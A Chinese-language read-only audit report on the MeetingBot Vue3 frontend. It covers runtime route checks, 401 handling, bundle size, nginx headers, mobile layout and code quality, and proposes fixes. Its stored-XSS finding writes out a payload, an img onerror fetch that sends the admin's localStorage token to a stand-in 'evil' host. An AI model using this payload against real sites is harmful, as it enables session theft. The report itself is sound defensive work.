# MeetingBot 前端只读审计报告

- 审计对象：`/home/song/code/Agent/media_agent/MeetingBot/meetingbot/vue`（Vue3 + Vite + Element Plus，生产构建由 nginx 提供）
- 运行站点：<http://127.0.0.1:18083>（容器 `meetingbot-aim-local-web-1`，构建产物时间 2026-10-30 06:00）
- 审计方式：源码静态审查 + Playwright（本机 Chrome，`channel="chrome"`）只读遍历 + `curl -I` / `docker exec` 验证；只做登录与 GET 浏览，未点击删除/保存/确认类按钮，未改代码、未写库、未 git
- 审计时间：2026-10-30
- 运行产物与源码一致性：构建 JS 中包含本次改造新增文案（"把一场会议，变成一份能用的纪要"、"AI调用与Token趋势" 等），14 个路由全部渲染，确认审计的是当前 main 分支构建
- 证据文件：`C:\Users\admin\AppData\Local\Temp\review\`（脚本 `audit_frontend.py`、`probe_extra.py`、`probe_extra2.py`、`probe_corrupt.py`、`probe_double_toast.py`；数据 `result.json`、`result_extra.json`、`result_extra2.json`；截图 `shots/*.png`）

严重度口径：高=可被利用的安全问题或明确功能损坏；中=真实缺陷/明显体验或交付问题；低=健壮性、可维护性、a11y 等改进项。

---

## 0. 结论摘要（Top 5）

1. **高｜存储型 XSS**：`Meeting.vue` 删除确认框用 `dangerouslyUseHTMLString` 拼接会议主题，任何员工都能创建恶意标题，管理员点"删除"即执行；token 存在 localStorage，可导致管理员会话被窃取。
2. **中｜网络异常时前端报 TypeError 且无任何提示**：`request.js:84-89` 未判空 `error.response`，实测请求被断时 `pageerror: Cannot read properties of undefined (reading 'status')`，页面只剩空表格。
3. **中｜401 处理缺陷**：并发请求会弹 7 条重复"登录状态已失效"（实测）；且不清 `xm-user` 缓存，路由守卫仍按 user.id 放行，可反复进入管理端再被踢回（实测）。
4. **中｜首屏包 2.4MB 未压缩 + 无路由懒加载**：入口 `index.js` 1.89MB（gzip 应 608KB）+ `index.css` 517KB（gzip 69KB），nginx 未开 gzip；14 个管理页组件（含 Login/Register/404 共 17 个视图）、ECharts、Element Plus 全量都在入口包，仅 `Manager.vue` 懒加载。
5. **中｜移动端 375px 不可用**：管理端无任何响应式断点，侧栏固定 220px 后内容区仅 155px；实测 14 个路由中 12 个文档横向溢出（426–686px），固定 460px 的弹窗超出屏幕。

任务要求的其余项（定时器清理、弹窗 SSE/轮询、blob 下载/401、头像 URL、风险级别、注册开关、XSS 面、token、硬编码、nginx 头、空状态、a11y）均有逐条结论，见下文；**风险级别保存、定时器清理、blob 下载、头像拼接等项实测通过**。

---

## 1. 全路由运行时遍历（任务 1）

方法：Playwright 1600×1000 登录 admin 后逐路由 `goto`，采集 `console`（error/warning）、`pageerror`、HTTP≥400/失败请求，并检查 `.manager-container`、`.card`、`.el-table__row`、`.el-empty`、ECharts canvas、面包屑、toast。结果：**14 个路由 + /login + /register + /404 全部 0 console error、0 pageerror、0 个 HTTP 4xx/5xx、0 个失败请求**，路由白屏 bug 已修复（每页 `.manager-container=1`，面包屑对应 `meta.name` 正确）。

| 路由 | 渲染关键元素（实测） | console error | pageerror | 失败请求 |
|---|---|---|---|---|
| /login | `.auth-form-box=1`，登录按钮，无注册入口 | 0 | 0 | 0 |
| /manager/home | 7 张 card、4 张统计卡、最近会议/纪要列表 | 0 | 0 | 0 |
| /manager/meeting | 表格 1 行（MTG-DEMO-001） | 0 | 0 | 0 |
| /manager/meetingMaterial | 表格 6 行，上传区 | 0 | 0 | 0 |
| /manager/transcription | 表格 1 行（已完成） | 0 | 0 | 0 |
| /manager/meetingMinutes | 表格 1 行（待确认） | 0 | 0 | 0 |
| /manager/agent | 表格 1 行（等待人工确认） | 0 | 0 | 0 |
| /manager/observability | 8 张统计卡 + 4 个 ECharts canvas + 2 张表 | 0 | 0 | 0 |
| /manager/aiModel | 表格 4 行 | 0 | 0 | 0 |
| /manager/promptTemplate | alert + 表格 5 行 | 0 | 0 | 0 |
| /manager/user | 表格 3 行 | 0 | 0 | 0 |
| /manager/department | 表格 2 行 | 0 | 0 | 0 |
| /manager/departmentMembers | 空表（admin 未分配部门，符合预期） | 0 | 0 | 0 |
| /manager/person、/password | 表单渲染 | 0 | 0 | 0 |
| /manager/不存在路径 | 重定向 `/404`，404 图 + 返回主页链接 | 0 | 0 | 0 |
| 未登录直接访问 /manager/home | 守卫重定向 `/login`（`router/index.js:61-67`） | 0 | 0 | 0 |

补充说明：后端业务错误统一返回 **HTTP 200 + `{code,msg}`**（`fastapi-app/common/exception_handler.py:20-28`），所以 HTTP 4xx/5xx 监控天然为空，业务失败通过 toast 记录（本次遍历无业务失败 toast）。

桌面端截图：`shots/desktop-01-login.png`、`desktop-00..13-manager-*.png`、`desktop-99-404.png`。

### 1.1 唯一运行时缺陷：/register 在生产环境仍可直达（低）

- 证据：`src/router/index.js:48` 注册路由无条件注册；`src/views/Register.vue` 全页无开关判断；登录页按 `src/views/Login.vue:45-48、71` 的 `VITE_REGISTER_ENABLED` 隐藏入口。实测生产构建 `/register` 正常渲染注册表单且"注册"按钮存在（`result.json → register_direct.register_button=1`）。
- 后端兜底：运行时容器 `REGISTER_ENABLED=false`，`api/__init__.py:82-86` 返回 code 403"注册功能未开启，请联系管理员创建账号"，不会真的建号。
- 建议：路由守卫拦截 `/register`（开关关闭时跳 `/login`），或按 `import.meta.env.VITE_REGISTER_ENABLED` 动态决定路由是否注册，避免"能填表单但必然失败"的体验。

### 1.2 本地缓存损坏导致白屏（低）

- 证据：`src/router/index.js:63` `JSON.parse(localStorage.getItem('xm-user') || '{}')` 无 try/catch（同样问题见 `src/utils/request.js:22`、`src/views/Manager.vue:107`）。实测把 `xm-user` 写成非法 JSON 后访问 `/manager/home`：`console: SyntaxError: "not-json" is not valid JSON`，URL 停在 `/manager/home`，页面既无登录页也无管理端（`#app` 基本为空），即白屏。
- 建议：抽 `safeParseUser()` 工具，解析失败时清缓存并 `return '/login'`。

---

## 2. 交互漏洞（任务 2）

### 2.1 定时器/轮询清理：通过（无问题）

- `src/views/manager/Transcription.vue:361-369`、`MeetingMinutes.vue:585-589`、`Agent.vue:394-396、412-416` 三处 `setInterval(3000)` 均在 `onUnmounted` 中 `clearInterval`。
- 实测（`result_extra.json → timer_cleanup_spa`）：给 `window.setInterval/clearInterval` 打桩后 SPA 点击左侧菜单切走，3 个页面创建的 interval（id=2, 3000ms）全部出现在 `cleared` 列表，无泄漏；翻页/查询等场景轮询只在"存在 RUNNING/PENDING/PROCESSING/GENERATING 行"时发请求（如 `Transcription.vue:361-366`），任务全部结束即停。
- 轮询与弹窗的关系：详情弹窗打开时页面轮询继续刷新列表（`Transcription.vue:202-205` 还会顺带刷新详情），属设计行为；仅剩一处体验缺口见 5.4。

### 2.2 Agent 详情 SSE：关闭弹窗能停，但 401 处理错误（中）

- 停止逻辑正确：`Agent.vue:87` `@closed="stopStream"`，`Agent.vue:281-287` abort 当前 `AbortController`，`Agent.vue:412-416` 卸载时也会 `stopStream()`；`Agent.vue:290-335` 用 fetch 读 SSE，不会出现重复连接（`startStream` 先 `stopStream`）。
- 但 401 时表现错误：`Agent.vue:304-305` 只判断 `response.ok` 和 `content-type`。实测无效 token 请求 `GET /api/agent/events/1` 返回 **HTTP 200 + `application/json` + `{"code":"401","msg":"登录状态已失效，请重新登录"}`**（curl 输出），于是 `response.ok=true` 但 content-type 不是 `text/event-stream` → 抛 `SSE unavailable` → 仅提示"自检实时连接已断开"，**不跳登录、不清过期缓存**。
- 次要：`Agent.vue:328-334` catch 后未 `abort()` controller，JSON 解析失败时已挂起的 fetch 流不会被主动取消（reader 循环已退出，连接可能悬挂到服务端关闭）。
- 建议：解析 JSON body，`code==='401'` 走统一登出流程；catch 中补 `controller.abort()`。

### 2.3 登录态过期后的页面表现（中）

- 401 处理在 `src/utils/request.js:62-74`：弹 `ElMessage.error` 后 `router.push('/login')`。实测（`result_extra.json → expired_401`）：
  - 首屏 `/manager/home` 并发 7 个接口 → **弹 7 条完全相同的"登录状态已失效，请重新登录"**；
  - 最终 URL 变成 `/login`，但 **`localStorage['xm-user']` 原样保留**（token 仍是坏值）；
  - 再次访问 `/manager/meeting`：路由守卫因 `user.id` 存在而放行（`router/index.js:63-66` 只查 id，不校验 token 有效性/过期），页面再次 401、再弹提示、再被踢回，形成"能进→被踢→能进"的循环；
  - 单个页面单次 401 还会**弹两次**：拦截器先弹一次（`request.js:72`），页面 `else ElMessage.error(res.msg)` 再弹一次（如 `Meeting.vue:243-245`、`AiModel.vue:172-174`）。实测在 `/manager/meeting` 坏 token 点"查询"：2 条相同 toast（`probe_double_toast.py` 输出）。
  - blob 接口 401（`request.js:52-67`）同样只跳转、不清缓存：实测坏 token 点 Word 导出，未产生下载、URL 跳到 `/login`，`xm-user` 仍保留坏 token。
- 建议：401 用单例标记去重（同一时刻只提示/跳转一次）；清 `localStorage.removeItem('xm-user')`；跳登录时带 `redirect` 参数，登录后回原页；拦截器 401 后 `return Promise.reject(...)`，避免页面再弹第二遍。

### 2.4 blob 下载 / 401（基本通过，1 处死代码）

- 成功路径实测通过：`/manager/meetingMinutes` 点 Word 导出，得到 `产品发布评审会-会议纪要.docx`，37,700 字节，无 console error（`result_extra2.json → blob_download_success`）；`request.js:52-67` 会把 JSON 错误体识别出来并 reject，不会把错误当文件保存。
- 但 `MeetingMinutes.vue:557-562` 的 `blob.type?.includes('application/json')` 分支实际不可达（`request.js:52-67` 已提前 reject），是重复/死代码；`MeetingMinutes.vue:571`、`MeetingMaterial.vue:428` 在 `link.click()` 后立即 `URL.revokeObjectURL`，Chrome 可用，但 Safari/Firefox 存在下载被取消的兼容风险，建议 `setTimeout(revoke, 0)` 或 `requestAnimationFrame` 后再释放。

### 2.5 头像 URL（resolveAssetUrl）：通过，仅缺默认占位（低）

- `src/utils/url.js:8-31` 逻辑正确：相对 `/files/...` 拼当前站点 origin；`http(s)://`、协议相对 `//`、`blob:`/`data:` 原样返回；空值返回 `''`。
- 实测 admin 头像：header `<img src="http://127.0.0.1:18083/files/download/1.png">`，`naturalWidth=693`，请求 200（`result_extra.json → avatar.with_avatar`）；`/manager/user`、`/manager/departmentMembers`、`/manager/person` 同样走该函数。
- 问题：无头像时 `resolveAssetUrl('')=''` → header `img src=""`，实测 `naturalWidth=0`，渲染 32×32 空白/破图（`result_extra.json → avatar.with_empty_avatar`），`Manager.vue:18` 未做 fallback；`User.vue:30-36` 空头像列直接留空。建议默认头像或 `el-avatar` 占位。

### 2.6 MeetingMinutes 风险级别保存逻辑：通过（无问题）

- 前端：`MeetingMinutes.vue:249-266` 定义 `LOW/MEDIUM/HIGH` 与中文映射，编辑弹窗用 `el-select` 选择（`343-356`），新增条目默认 `MEDIUM`（`302`），旧数据中文值 `normalizeLevel` 归一化（`260-266`）。
- 后端：`services/minutes_service.py:62` `level: Literal["LOW","MEDIUM","HIGH"]`，`api/meeting_minutes.py:40-43` `EditPayload(MinutesResult)` 对 PUT 同样校验。前后端口径一致，页面不会提交中文级别，不存在"枚举不匹配导致保存失败"问题。

### 2.7 注册开关（中低）

见 1.1：生产 `VITE_REGISTER_ENABLED=false` 只隐藏登录页入口，`/register` 路由仍可直达并渲染可提交表单，后端 403 兜底。建议同 1.1。

### 2.8 表单校验（通过，可增强）

- 登录/注册：必填 + 两次密码一致（`Login.vue:79-88`、`Register.vue:73-105`），前后端双校验（`api/__init__.py:96-99`）。
- 会议表单：主题/起止时间/主持人必填（`Meeting.vue:192-197`），起止时间先后/主持人有效性由后端校验（`api/meeting.py:65-89`）。
- 纪要修订：摘要非空前端拦截（`MeetingMinutes.vue:463`），六块内容结构由后端 Pydantic 校验。
- 缺口：`Person.vue` 手机号/邮箱无格式校验（`Person.vue:28-34`），`User.vue` 新增用户密码无强度校验（`User.vue:85-87` 仅 placeholder 说明默认 123456）；后端也未见强校验，建议补。

### 2.9 弹窗关闭后 SSE/轮询是否停止（小结）

- Agent SSE：关闭弹窗即 abort（见 2.2），通过。
- 页面轮询：不随弹窗关闭而停止，但只在有进行中任务时发请求，且离开路由即清（见 2.1），符合设计。
- 资料预览弹窗：`MeetingMaterial.vue:110` `destroy-on-close + @closed="closePreview"`，blob URL 正确释放（`403-410`），通过。
- Observability 图表：`resize` 监听与 chart 实例在 `onUnmounted` 中移除/dispose（`Observability.vue:374-384`），通过。

---

## 3. 安全（任务 3）

### 3.1 高｜存储型 XSS（dangerouslyUseHTMLString + 用户可控会议标题）

- 证据：`src/views/manager/Meeting.vue:361-365` 把 `preview.title` 用模板字符串拼进 HTML，`:367-371` 以 `dangerouslyUseHTMLString: true` 交给 `ElMessageBox.confirm` 渲染；`preview` 来自 `GET /meeting/deletePreview/{id}`（`Meeting.vue:343`），`title` 即数据库会议主题。后端对主题只做非空校验，无转义/长度限制（`api/meeting.py:65-68`、`api/meeting.py:233`），且**任何登录用户**都可 `POST /meeting/add`（`api/meeting.py:224-247` 仅要求登录）。
- 攻击链：普通员工创建标题为 `<img src=x onerror="fetch('//evil/?c='+encodeURIComponent(localStorage['xm-user']))">` 的会议 → 管理员在"会议管理"点"删除" → 确认框 HTML 执行脚本 → 读取 localStorage 里的 `xm-user.token`（`Login.vue:107`、`request.js:22-24` 全部请求带该 token）→ 管理员会话被接管。
- 缓解现状：全仓 grep 无其他 `v-html`/`innerHTML`/`outerHTML`；这是唯一 HTML 注入点（`grep v-html|innerHTML|dangerouslyUseHTMLString` 仅命中 `Meeting.vue:366-370`）。
- 建议：删除 `dangerouslyUseHTMLString`，确认框正文用 `h()`/独立弹窗组件渲染结构化数据（标题 + 统计列表）；后端对 title 做长度限制与 HTML 转义/过滤；追加 CSP 作为纵深防御（见 4.3）。

### 3.2 token 存储与暴露面（中，与 3.1 组合为高风险）

- 证据：`Login.vue:107` 把后端返回的整份用户信息（含 token）写入 `localStorage['xm-user']`；`request.js:22-24` 每个请求从 localStorage 取 token 放请求头；`Person.vue:88` 保存资料时整份写回；`User.vue:93`、`Person.vue:7` 把 token 放进 el-upload 的 headers（未泄漏到 DOM，但均以明文存在 Web Storage）。
- 影响：任何 XSS（如 3.1）都能直接窃取长期 token；登出仅 `removeItem`（`Manager.vue:110-114`、`Password.vue:82-86`），服务端未吊销。
- 建议：优先改 HttpOnly Cookie + CSRF 防护；至少缩短 token TTL 并在登出/改密时服务端吊销；CSP 限制外连。

### 3.3 错误处理是否泄漏敏感信息（通过）

- `request.js:82-92` 对 404/500 只显示固定文案，其余 `console.error(error.message)`（`:89`），未把响应体/堆栈/后端内部信息展示给用户；全仓无 `console.log` 残留（grep 仅此 1 处 `console.error`）。
- 前端无硬编码密钥：grep `password/api_key/sk-` 仅命中表单/说明文案；实测构建产物不含 `APP_ADMIN_PASSWORD` 或 `.env` 里的实际密码值；`AiModel.vue:189-194` 只是模型默认服务地址（非密钥）。后端列表接口对 api_key 做掩码（`AiModel.vue:34` 注释+实测表格显示掩码）。
- 小问题：`server` 响应头暴露 nginx 版本 `Server: nginx/1.30.5`（见 4.3）。

### 3.4 其它 XSS/注入面（通过）

- 无 `v-html`/`innerHTML`；会议标题/纪要内容/转写文本/失败原因等全部通过 `{{ }}` 文本插值或 `h('p', text)` 渲染（`MeetingMinutes.vue:268-289`），安全。
- URL 参数仅 `Number(route.query.meetingId)`（`MeetingMaterial.vue:164` 等），无 open redirect；下载文件名取自数据库但只用于 `a.download`，不构成注入。
- `el-upload` 自定义 headers 不含用户可控值；`el-image preview-src-list` 只走 `resolveAssetUrl`。

---

## 4. 性能 / 交付（任务 4）

### 4.1 中｜首屏包 2.4MB 未压缩，未按路由懒加载

- 证据（源码）：`src/router/index.js:3-20` 一次性静态 import 全部 14 个页面组件，只有 `/manager` 容器用动态 import（`:28`）；`src/main.js:5-6` 全量 `import ElementPlus from 'element-plus'` + `import 'element-plus/dist/index.css'`，`:15-18` 注册**全部** Element Plus 图标。`vite.config.js` 里的 `unplugin-auto-import/unplugin-vue-components/ElementPlusResolver` 按需方案因此被抵消。
- 证据（构建产物，`docker exec meetingbot-aim-local-web-1 sh -c "du -sh /usr/share/nginx/html/assets; ls -lhS ..."`）：

```
2.5M  /usr/share/nginx/html/assets
-rw-r--r-- 1.8M  index-Cw_fB3Qa.js     ← 入口 JS 1,890,256 字节
-rw-r--r-- 505K  index-Dt-sMRrO.css    ← 入口 CSS 517,278 字节
-rw-r--r-- 4.2K  Manager-Dl9ULjzl.js   ← 唯一懒加载 chunk
-rw-r--r-- 24K   Manager-BAV5ffHk.css
```

- 量化：入口 JS+CSS = 2,407,534 字节（≈2.3MiB），gzip 后仅需 608,270+69,122=677,392 字节（≈661KiB，可省约 72%）；实测 `index.js` 内包含 `ElColorPicker/ElDrawer/ElRate/ElWatermark/ElTreeSelect` 等源码从未使用的组件代码，包含 `AI调用与Token趋势`、`修订会议纪要`、`Prompt模板保存成功` 等页面唯一文案 → 14 个管理页组件与 ECharts 全部进入首屏入口。
- 建议：
  1. 路由全部改用 `() => import(...)`（尤其 Observability 的 ECharts，应独立成 chunk）；
  2. `main.js` 去掉全量 `app.use(ElementPlus)` 与全图标注册，保留现有 unplugin 按需方案（图标按需 import）；
  3. 在 `vite.config.js` 增加 `build.rollupOptions.output.manualChunks` 拆分 echarts/element-plus；
  4. 实测入口 JS 首屏 1.89MB，桌面内网尚可，远程/弱网首屏明显变慢。

### 4.2 中｜nginx 未开 gzip/缓存

- 证据：`nginx.conf` 全文（46 行）无 `gzip`、无 `expires`/`Cache-Control`。实测：

```
$ curl -I -H "Accept-Encoding: gzip, br" http://127.0.0.1:18083/assets/index-Cw_fB3Qa.js
HTTP/1.1 200 OK
Content-Type: application/javascript
Content-Length: 1890256        ← 与不压缩完全一致，无 Content-Encoding
Last-Modified: ...  ETag: "..."  Accept-Ranges: bytes
```

（CSS 同理 `Content-Length: 517278`，无 `Content-Encoding`；`/` 与 `/assets/*` 均无 `Cache-Control`。）
- 建议：`gzip on; gzip_types text/css application/javascript image/svg+xml; gzip_min_length 1024;`；对 `/assets/`（文件名带 hash）设 `expires 1y; add_header Cache-Control "public, immutable";`；对 `index.html` 设 `Cache-Control: no-cache`。

### 4.3 中｜无任何安全响应头

- 证据（`curl -I http://127.0.0.1:18083/` 实测响应头仅）：`Server: nginx/1.30.5`、`Date`、`Content-Type`、`Content-Length`、`Last-Modified`、`Connection`、`ETag`、`Accept-Ranges`。
- 缺失：`Content-Security-Policy`、`X-Frame-Options`/`frame-ancestors`、`X-Content-Type-Options: nosniff`、`Referrer-Policy`、`Permissions-Policy`、HSTS（HTTPS 部署时）；`server_tokens` 未关，暴露 nginx 版本。
- 建议：在 `nginx.conf` server/location 增加上述 `add_header ... always`，`server_tokens off;`，CSP 起步可用 `default-src 'self'; img-src 'self' data: blob:; media-src 'self' blob:; style-src 'self' 'unsafe-inline'; script-src 'self'`（Element Plus 需要 inline style）。

### 4.4 中｜移动端 375px 管理端不可用

- 根因：`src/assets/css/manager.css:17-23、45-50` 顶栏左区/侧栏固定 `width: 220px`，该框架样式文件无任何媒体查询（管理端仅 `Home.vue:262` 与 `Observability.vue:448` 有局部断点，`auth.css:140-153` 的 900px 断点只覆盖登录/注册页，所以登录页移动端正常、管理端不行）；各页面筛选控件写死 `230/240/260/330/340/360px`（如 `Meeting.vue:5-11`、`MeetingMaterial.vue:5-15`、`MeetingMinutes.vue:5-22`、`Transcription.vue:5-13`、`Agent.vue:5-9`），弹窗 `width="460px"`（`MeetingMaterial.vue:79`）。
- 实测（`result_extra.json → mobile_375`，viewport 375×812）：侧栏 220px、内容区仅 155px；**14 个路由中 12 个出现文档横向溢出**：home 426、meeting 489、material 619、transcription 589、meetingMinutes 599、agent 519、observability 686、aiModel/promptTemplate/user/department 499、person 461（viewport=375）；`departmentMembers/password` 未溢出但内容同样被压到 155px。截图 `shots/extra-mobile-*.png`：统计卡片逐字换行、表格只剩"操作"列、图表被压成细条；"发起转写"弹窗宽度 460px > 375（实测 `dialog.right=460`，右侧被截断，`shots/extra-mobile-dialog.png`）。
- 建议：加 `@media (max-width: 900px)`：侧栏改为顶部抽屉菜单（`el-drawer`）或折叠；主内容 `width:100%`；筛选控件 `width:100%`/flex-wrap；表格设置 `min-width` + 内部横向滚动；弹窗 `width: min(92vw, 460px)`；顶栏隐藏面包屑/缩小品牌区。

### 4.5 其它交付项

- 单页 title 不随路由变化：14 个路由实测 `document.title` 恒为 "MeetingBot · AI 智能会议纪要辅助系统"（`router/index.js:55-59` 的 `afterEach` 只 `window.scroll`，未设置 title）。低。
- `index.html` 无 `lang` 问题（`zh-CN` 正确）、viewport 正确、favicon 已配置（`/favicon.svg` 690B、`/favicon.ico` 552B 均 200），通过。
- 404 页图片 `404.jpg` 153KB 只在 404 路由渲染时请求，不影响首屏，通过。

---

## 5. 代码质量（任务 5）

### 5.1 重复页面结构 / 复制粘贴（低）

- 登录/注册页左侧介绍区与步骤数组几乎完全重复：`Login.vue:3-22、62-68` vs `Register.vue:3-22、65-71`；右侧表单结构雷同，仅字段不同。
- 10+ 列表页（User/Department/AiModel/PromptTemplate/Meeting/MeetingMaterial/Transcription/MeetingMinutes/Agent 等）都是"筛选卡 + 操作卡 + 表格卡 + 分页卡"同一骨架，查询/重置/分页/状态映射逻辑逐页复制（如 `statusText/statusTag` 在 `Meeting.vue:208-210`、`MeetingMinutes.vue:408-411`、`Transcription.vue:165-167`、`Agent.vue:215-225` 各写一遍）；`meetingLabel`（`MeetingMaterial.vue:236`、`MeetingMinutes.vue:15`、`Transcription.vue:169`）重复。
- 建议：抽 `PageTableLayout`、`usePagedList`、`useStatusText` 等公共组件/composable，状态字典集中到 `src/constants/`。

### 5.2 死代码（低）

- `src/assets/css/global.css:48-87` 的 `.line1`–`.line4`、`.dark1` 在 `src/` 中无任何使用（grep 仅命中定义本身）。
- `src/views/manager/Agent.vue:500-503` `.revision-title` 未被任何模板使用。
- `src/views/manager/MeetingMinutes.vue:559-562` 的 JSON-blob 二次判断不可达（`request.js:52-67` 已处理），同逻辑在 `MeetingMaterial.vue` 无重复版本。
- 建议：删除无效样式/分支，`vite build` 无 tree-shaking 价值但可减少认知负担。

### 5.3 缺失空状态/错误态（中）

- 实测（`result_extra2.json → observability_empty / observability_business_error`）：mock `/observability/overview` 返回空数据 → 8 张统计卡全 0、4 个空白 ECharts canvas、无任何空状态提示；mock `code=500` → 仅一条 toast "系统错误" 后消失，卡片全 0、无错误横幅、无重试按钮。`Observability.vue:31-79` 没有 `el-empty`/错误块（全仓 `el-empty` 仅出现在 `Home.vue:29、48`）。
- 表格页在接口失败/为空时只剩 Element Plus 默认"暂无数据"（可接受），但**错误**与**空数据**无法区分，且失败后无重试入口。
- 建议：Observability 增加"暂无观测数据"空态与失败重试；列表页增加统一加载/错误占位（可用 `v-loading` + `el-result`/`el-empty`）。

### 5.4 详情弹窗数据不自动刷新（低）

- `MeetingMinutes.vue` 列表 3s 轮询（`:584-589`）只刷新表格；若打开"生成中"纪要详情，弹窗内容不会更新（对比 `Transcription.vue:202-205` 有"弹窗开着且未完成时顺带刷新详情"）。`Agent.vue` 靠 SSE 更新，正常。建议统一详情刷新策略。

### 5.5 可访问性（低-中）

- 图标按钮无名称：`User.vue:61-62`、`Department.vue:43-45` 的 `circle + :icon` 按钮没有 `title`/`aria-label`；实测 `/manager/user` 12 个按钮中 6 个无可访问名称，`/manager/department` 10 个中 4 个（`result_extra.json → a11y_icon_buttons`）。
- 无表单 label 关联问题（el-form-item 均带 label），登录页图片有 `alt=""` 视为装饰可接受；但全局无"跳到主内容"链接、删除/编辑按钮的可读名称缺失对视障用户不友好。
- 建议：给 icon-only 按钮加 `aria-label`（如"编辑用户""删除用户"），保留表格行上下文时可用 `aria-label="编辑 用户名"`。

### 5.6 确认框取消产生未处理 Promise rejection（低）

- 全仓大量 `ElMessageBox.confirm(...).then(...)` 无 `.catch`：`Meeting.vue:326、367、388`，`MeetingMinutes.vue:477、490、508、528、545`，`Transcription.vue:229、249、265、326`，`Agent.vue:351、356、383`，`User.vue:247、267`，`Department.vue:190、211`，`MeetingMaterial.vue:460、479`，`AiModel.vue:262`，`DepartmentMember.vue` 相关等。Element Plus 在点"取消"时以 `'cancel'` reject，未 catch 会在浏览器 console 产生 `Uncaught (in promise) cancel`（静态分析结论，按只读要求未实际点确认框取消）。
- 建议：统一封装 `confirmDialog()` 返回 boolean（内部 catch），或每处补 `.catch(() => {})`。

---

## 6. 已验证通过项（无问题，供复核）

| 检查项 | 结论 | 证据 |
|---|---|---|
| 路由白屏 bug 修复 | 通过：14 路由 + /login + /register + /404 全部渲染，0 console error/pageerror/失败请求 | `result.json → desktop_routes`；`shots/desktop-*` |
| 路由守卫 | 通过：未登录访问 /manager/* → /login；requiresAdmin 页面按 role 拦截（`router/index.js:61-72`） | `result.json → guard` |
| setInterval 清理 | 通过：3 页 interval 在 SPA 切走后均 clearInterval | `result_extra.json → timer_cleanup_spa` |
| 弹窗关闭停 SSE/释资源 | 通过：Agent `@closed=stopStream`、预览 `@closed=closePreview`、ECharts dispose | `Agent.vue:87、281-287`；`MeetingMaterial.vue:110、403-410`；`Observability.vue:374-384` |
| blob 下载/JSON 错误识别/401 跳转 | 通过：Word 导出 37,700B 成功；坏 token 不落盘并跳登录 | `result_extra2.json`、`result.json → blob_401` |
| resolveAssetUrl | 通过：`/files/download/1.png` 拼接后 200、naturalWidth=693 | `result_extra.json → avatar` |
| 风险级别保存 | 通过：前后端均为 LOW/MEDIUM/HIGH，旧中文值归一化 | `MeetingMinutes.vue:249-266、302`；`minutes_service.py:62`；`meeting_minutes.py:40-43` |
| 注册开关 | 登录页入口隐藏（生产）；后端 REGISTER_ENABLED=false 拒绝建号；仅 /register 直达体验问题 | `Login.vue:45-48、71`；`api/__init__.py:82-86`；容器 env |
| XSS grep | 无 v-html/innerHTML；唯一注入点 3.1 | `grep v-html|innerHTML|dangerouslyUseHTMLString` |
| 敏感硬编码 | 无：构建产物不含 .env 密码/Token，无 secret | `index.js` 搜索 `APP_ADMIN_PASSWORD/WekWLOjfBoazoe3w` 均为 False |
| 错误信息泄漏 | 通过：仅固定文案 + console.error | `request.js:82-92` |
| 登录/注册页移动端 | 通过：375px 正常（`auth.css:140-153`） | `shots/extra-mobile-auth-login.png` |
| 构建/运行一致性 | 通过：构建含本次新增文案，页面为当前代码 | 构建 JS 文案比对 |

---

## 7. 修复优先级建议

| 优先级 | 条目 | 位置 |
|---|---|---|
| P0 | 去掉 `dangerouslyUseHTMLString`，修复存储型 XSS；补 CSP | `Meeting.vue:341-383`、`nginx.conf` |
| P0 | 401 统一处理：去重、清 localStorage、跳登录带 redirect、拦截器 reject | `request.js:62-74`、`router/index.js:61-72` |
| P1 | `error.response` 判空 + 网络/超时提示 | `request.js:82-92` |
| P1 | 路由懒加载 + Element Plus/图标按需 + nginx gzip/缓存/安全头 | `router/index.js:3-28`、`main.js:5-18`、`vite.config.js`、`nginx.conf` |
| P1 | 移动端断点：侧栏抽屉、内容全宽、弹窗 `min(92vw,460px)` | `manager.css`、各页筛选/弹窗 |
| P2 | Observability 空/错误态与重试；列表页统一错误态 | `Observability.vue:31-79、339-365` |
| P2 | `/register` 关闭时路由重定向 | `router/index.js:48` |
| P2 | 安全响应头 + `server_tokens off` | `nginx.conf` |
| P3 | 图标按钮 aria-label；默认头像；死代码/重复代码清理；confirm 统一封装；安全解析 localStorage | 见 5.x / 2.5 / 1.2 |

---

## 8. 审计脚本与证据复现

- 全路由遍历：`python C:\Users\admin\AppData\Local\Temp\review\audit_frontend.py` → `result.json`、`shots/desktop-*`、`shots/mobile-*`
- 定时器/401/头像/a11y/375px：`python ...\probe_extra.py` → `result_extra.json`、`shots/extra-mobile-*`
- blob 下载/观测空态/移动端弹窗：`python ...\probe_extra2.py` → `result_extra2.json`、`shots/extra-03..05`
- 缓存损坏白屏：`python ...\probe_corrupt.py`；401 双提示：`python ...\probe_double_toast.py`
- nginx：`curl -I http://127.0.0.1:18083/`、`curl -I -H "Accept-Encoding: gzip, br" http://127.0.0.1:18083/assets/index-Cw_fB3Qa.js`
- 产物：`docker exec meetingbot-aim-local-web-1 sh -c "du -sh /usr/share/nginx/html/assets; ls -lhS /usr/share/nginx/html/assets"`
- gzip 量化：`python -c "import gzip,pathlib; ..."` → JS 1,890,256→608,270；CSS 517,278→69,122
